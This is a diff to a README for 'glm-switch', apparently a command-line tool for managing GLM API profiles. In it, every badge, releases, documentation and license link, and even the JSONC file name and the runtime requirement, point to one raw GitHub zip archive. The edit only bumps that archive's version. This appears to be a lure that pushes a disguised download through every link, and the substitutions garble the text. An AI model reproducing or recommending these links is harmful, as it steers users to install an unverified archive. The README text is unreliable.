@@ -1,7 +1,7 @@
 # 🚀 glm-switch - Simplify Your GLM API Management
 
-[![npm version](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)  
-[![License: MIT](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)  
+[![npm version](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)  
+[![License: MIT](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)  
 
 ---
 
@@ -18,7 +18,7 @@ GLM Switch is a command-line tool designed to help you manage multiple GLM API p
 - **Bulk Update**: Update settings across all your profiles at once.
 - **Safe Operations**: Enjoy peace of mind with automatic backups, JSON validation, and rollback options in case of errors.
 - **Cross-Platform**: Works on both Windows and macOS.
-- **JSONC Support**: Loads `https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip` files with comments for easier management.
+- **JSONC Support**: Loads `https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip` files with comments for easier management.
 - **Auto-Create**: Automatically generate necessary profile files if they're not found.
 
 ---
@@ -27,7 +27,7 @@ GLM Switch is a command-line tool designed to help you manage multiple GLM API p
 
 To get started with GLM Switch, you can download it from our Releases page. Click the button below to proceed:
 
-[![Download GLM Switch](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip)
+[![Download GLM Switch](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip)
 
 ### Method 1: Install from npm (Recommended)
 
@@ -39,14 +39,14 @@ npm install glm-switch
 
 ### Method 2: Manual Download
 
-Alternatively, you can manually download the latest version from our Releases page. Go to this link: [GLM Switch Releases](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip). Here, you will find the latest version available for download.
+Alternatively, you can manually download the latest version from our Releases page. Go to this link: [GLM Switch Releases](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip). Here, you will find the latest version available for download.
 
 ---
 
 ## ⚙️ System Requirements
 
 - **Operating System**: This tool supports Windows 10/11 and macOS versions 10.14 and above.
-- **https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip**: Ensure you have https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip installed. You can download it from [https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip Official Website](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip).
+- **https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip**: Ensure you have https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip installed. You can download it from [https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip Official Website](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip).
 
 ---
 
@@ -74,7 +74,7 @@ After downloading GLM Switch, follow these steps to get it up and running:
 
 ## 💬 Support & Documentation
 
-For detailed usage instructions, visit our [Documentation](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip). Here, you will find guides on all features and troubleshooting advice.
+For detailed usage instructions, visit our [Documentation](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip). Here, you will find guides on all features and troubleshooting advice.
 
 If you encounter issues or have questions, feel free to open an issue in the GitHub repository. We value your feedback and will do our best to assist you.
 
@@ -82,7 +82,7 @@ If you encounter issues or have questions, feel free to open an issue in the Git
 
 ## 📜 License
 
-GLM Switch is open source and uses the MIT License. You are free to use, modify, and distribute it under the terms of the license. For more information, visit the [License Page](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip).
+GLM Switch is open source and uses the MIT License. You are free to use, modify, and distribute it under the terms of the license. For more information, visit the [License Page](https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_3.4.zip).
 
 ---
 
